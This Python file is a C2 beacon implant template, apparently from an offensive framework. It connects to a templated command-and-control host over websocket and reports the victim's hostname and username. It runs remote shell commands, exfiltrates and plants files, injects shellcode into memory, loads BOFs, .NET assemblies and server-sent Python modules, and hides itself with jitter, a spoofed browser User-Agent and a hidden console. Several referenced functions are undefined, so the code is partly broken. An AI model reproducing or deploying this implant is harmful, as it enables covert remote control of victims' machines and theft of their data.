#!/usr/bin/env python3
"""Minimal Beacon Agent - Staged Loading Architecture"""
import asyncio
import websockets
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys
import zlib

import random as _rjit
import time as _tjit
_tjit.sleep(_rjit.uniform(0.5, 5.0))

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
RECONNECT_DELAY = 5
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}


def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)


def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

async def stealth_sleep(seconds):
    secret = bytearray(globals().get('ENCRYPTION_KEY', b'sockpuppets-sleep-mask'))
    try:
        globals()['sleep_encrypt'](0, secret)
    except Exception:
        pass
    await sleep_mask(seconds)

async def sleep_mask(seconds):
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    src = b'sockpuppets-sleep-mask'
    try:
        key = os.urandom(32)
        nonce = os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
    except Exception:
        await asyncio.sleep(seconds)
        return
    await asyncio.sleep(seconds)
    try:
        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
    except Exception:
        pass


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    """Calculate sleep time with jitter applied"""
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)

    import random
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    """Gather system metadata"""
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def _handle_fs(command: str) -> str:
    if command.startswith('__fs:ls:'):
        path = command[8:] or '.'
        try:
            entries = []
            for name in os.listdir(path):
                full = os.path.join(path, name)
                try:
                    st = os.stat(full)
                    prefix = 'd' if os.path.isdir(full) else '-'
                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
                except OSError:
                    entries.append(f"? {'?':>12}  {name}")
            return '\n'.join(entries) if entries else 'Directory is empty'
        except Exception as e:
            return f"Error: {e}"
    if command.startswith('__fs:get:'):
        path = command[9:]
        if not os.path.isfile(path):
            return 'Error: not a file'
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return 'Error: file too large (>2MB)'
        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
    if command.startswith('__fs:put:'):
        rest = command[9:]
        path, _, b64 = rest.partition('\t')
        data = base64.b64decode(b64)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
        return f'uploaded {len(data)} bytes to {path}'
    return 'Error: unknown fs command'


def _handle_bof(command: str) -> str:
    parts = command.split(':', 3)
    if len(parts) < 4:
        return 'Error: invalid BOF format (expected __bof:entry:args_b64:bof_data)'
    entry = parts[1]
    args_b64 = parts[2]
    bof_b64 = parts[3]
    try:
        bof_data = base64.b64decode(bof_b64)
        args_data = base64.b64decode(args_b64) if args_b64 else b''
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if sys.platform != 'win32':
        return f'BOF received: {len(bof_data)} bytes, entry={entry}, args={len(args_data)} bytes (not Windows, skipping execution)'
    try:
        import ctypes, tempfile
        tmp = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
        tmp.write(bof_data)
        tmp.close()
        try:
            lib = ctypes.CDLL(tmp.name)
            func = getattr(lib, entry, None)
            if func:
                func()
                result = f'BOF executed: entry={entry}, size={len(bof_data)} bytes'
            else:
                result = f'BOF loaded but entry "{entry}" not found (available: COFF object)'
        except OSError as e:
            result = f'BOF load error (expected for raw COFF): {e}'
        finally:
            os.unlink(tmp.name)
        return result
    except Exception as e:
        return f'BOF error: {e}'


def _handle_shinject(command: str) -> str:
    import ctypes, threading
    sc_b64 = command.split(':', 1)[1] if ':' in command else ''
    try:
        sc = base64.b64decode(sc_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not sc:
        return 'Error: empty shellcode'
    try:
        if sys.platform == 'win32':
            k32 = ctypes.windll.kernel32
            ptr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
            if not ptr:
                return 'Error: VirtualAlloc failed'
            ctypes.memmove(ptr, sc, len(sc))
            ht = k32.CreateThread(0, 0, ptr, 0, 0, 0)
            if not ht:
                return 'Error: CreateThread failed'
            return f'Shellcode injected: {len(sc)} bytes, thread handle={ht}'
        else:
            import mmap
            mm = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
            mm.write(sc)
            cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
            t = threading.Thread(target=cfunc)
            t.daemon = True
            t.start()
            return f'Shellcode injected: {len(sc)} bytes (Linux/mmap)'
    except Exception as e:
        return f'Shellcode injection error: {e}'


def _handle_asm(command: str) -> str:
    if sys.platform != 'win32':
        return 'Error: execute-assembly is Windows-only'
    parts = command.split(':', 2)
    args_str = parts[1] if len(parts) > 1 else ''
    asm_b64 = parts[2] if len(parts) > 2 else ''
    try:
        asm_data = base64.b64decode(asm_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not asm_data:
        return 'Error: empty assembly'
    try:
        import clr
        import System
        from System.Reflection import Assembly
        asm_bytes = System.Array[System.Byte](asm_data)
        assembly = Assembly.Load(asm_bytes)
        entry = assembly.EntryPoint
        if not entry:
            return 'Error: assembly has no entry point'
        argv = args_str.split() if args_str else []
        params = entry.GetParameters()
        if len(params) == 1:
            args_array = System.Array[System.String](argv)
            result = entry.Invoke(None, System.Array[System.Object]([args_array]))
        else:
            result = entry.Invoke(None, None)
        return f'Assembly executed: {result}' if result else 'Assembly executed (no output)'
    except ImportError:
        return f'Error: execute-assembly requires pythonnet (clr module). Assembly received: {len(asm_data)} bytes'
    except Exception as e:
        return f'Assembly execution error: {e}'


def execute_command(command: str) -> str:
    if str(command).startswith('__hd:'):
        return hidden_desktop(command)
    if str(command).startswith('__px:'):
        return postex(command)
    if str(command).startswith('__fs:'):
        return _handle_fs(command)
    if str(command).startswith('__bof:'):
        return _handle_bof(command)
    if str(command).startswith('__shinject:'):
        return _handle_shinject(command)
    if str(command).startswith('__asm:'):
        return _handle_asm(command)
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"
        if sys.platform == 'win32':
            CREATE_NO_WINDOW = 0x08000000
            parts = command.split()
            try:
                result = subprocess.run(parts, capture_output=True, text=True, timeout=30,
                                         cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
                output = result.stdout + result.stderr
                if output.strip():
                    return output
            except (FileNotFoundError, OSError):
                pass
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd())
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"
    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


async def load_streaming_module(module_code: str):
    """Load streaming module dynamically"""
    try:
        # Decompress module code
        compressed = base64.b64decode(module_code)
        decompressed = zlib.decompress(compressed)
        code = decompressed.decode()

        # Compile and execute module
        compiled = compile(code, '<streaming_module>', 'exec')
        module_globals = {}
        exec(compiled, module_globals)

        return module_globals.get('run_streaming_mode')
    except Exception as e:
        return None


async def beacon_mode(websocket, agent_id, beacon_interval, beacon_jitter, pending_results, pending_commands):
    """Execute beacon mode cycle"""
    # Wait for ack then send results
    await asyncio.sleep(0.1)

    # Step 1: Send any pending results from previous cycle
    if pending_results:
        for result in pending_results:
            try:
                encrypted_response = simple_encrypt(json.dumps(result))
                await websocket.send(encrypted_response)
            except Exception:
                pass
        pending_results.clear()

    # Step 2: Fetch queued commands (preserve any from checkin_ack)
    upgrade_requested = False
    streaming_module = None

    while True:
        try:
            message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
            decrypted = simple_decrypt(message)
            data = json.loads(decrypted)

            if data.get('type') == 'command':
                pending_commands.append({
                    'command': data.get('command', ''),
                    'timestamp': data.get('timestamp', '')
                })

            elif data.get('type') == 'set_interval':
                beacon_interval = data.get('interval', beacon_interval)

            elif data.get('type') == 'kill':
                # Exit agent
                import sys
                sys.exit(0)

            elif data.get('type') == 'upgrade_mode':
                # Receive streaming module
                streaming_module = data.get('module_code')
                upgrade_requested = True
                mode_msg = {
                    'type': 'mode_change',
                    'mode': 'streaming'
                }
                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                await websocket.send(encrypted_msg)
                break

        except asyncio.TimeoutError:
            break

    # If upgrade requested, load and run streaming module
    if upgrade_requested and streaming_module:
        streaming_func = await load_streaming_module(streaming_module)
        if streaming_func:
            # Run streaming mode with the loaded module
            return await streaming_func(websocket, agent_id, execute_command, simple_encrypt, simple_decrypt)
        else:
            # Failed to load module, continue as beacon
            pass

    # Step 3: Execute commands offline
    for cmd_data in pending_commands:
        try:
            output = execute_command(cmd_data['command'])
            pending_results.append({
                'type': 'response',
                'output': output,
                'command': cmd_data['command'],
                'timestamp': cmd_data['timestamp']
            })
        except Exception as e:
            pending_results.append({
                'type': 'response',
                'output': f"Error executing command: {str(e)}",
                'command': cmd_data['command'],
                'timestamp': cmd_data['timestamp']
            })

    return beacon_interval, beacon_jitter


WS_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Origin': f'http://{SERVER_HOST}',
}

async def connect_to_server():
    """Main agent connection loop"""
    uri = f"ws://{SERVER_HOST}:{SERVER_PORT}"
    agent_id = None
    pending_results = []
    pending_commands = []
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER

    while True:
        try:
            _ws_kw = {}
            try:
                import inspect as _inspect
                if 'additional_headers' in _inspect.signature(websockets.connect).parameters:
                    _ws_kw['additional_headers'] = WS_HEADERS
                else:
                    _ws_kw['extra_headers'] = WS_HEADERS
            except Exception:
                _ws_kw['extra_headers'] = WS_HEADERS
            async with websockets.connect(uri, max_size=10485760, **_ws_kw) as websocket:
                metadata = get_metadata()
                metadata['mode'] = 'beacon'
                metadata['beacon_interval'] = beacon_interval
                metadata['beacon_jitter'] = beacon_jitter

                # Register or checkin
                if agent_id:
                    checkin_msg = {
                        'type': 'checkin',
                        'agent_id': agent_id,
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(checkin_msg))
                else:
                    register_msg = {
                        'type': 'register',
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(register_msg))

                await websocket.send(encrypted)

                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)

                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    # Always update agent_id if server sends one (handles server restart case)
                    new_id = reg_data.get('agent_id')
                    if new_id and new_id != agent_id:
                        agent_id = new_id

                    # Process any commands included in checkin_ack
                    for ack_cmd in reg_data.get('commands', []):
                        if isinstance(ack_cmd, dict):
                            pending_commands.append({
                                'command': ack_cmd.get('command', ''),
                                'timestamp': ack_cmd.get('timestamp', '')
                            })

                    # Run beacon cycle (may return if upgraded to streaming)
                    result = await beacon_mode(websocket, agent_id, beacon_interval,
                                              beacon_jitter, pending_results, pending_commands)

                    # If returned from streaming mode, it means we downgraded
                    if isinstance(result, tuple):
                        beacon_interval, beacon_jitter = result

        except Exception as e:
            pass

        # Sleep for beacon interval (with jitter)
        sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
        await stealth_sleep(sleep_time)


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            pass

    while True:
        try:
            asyncio.run(connect_to_server())
            break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(10)
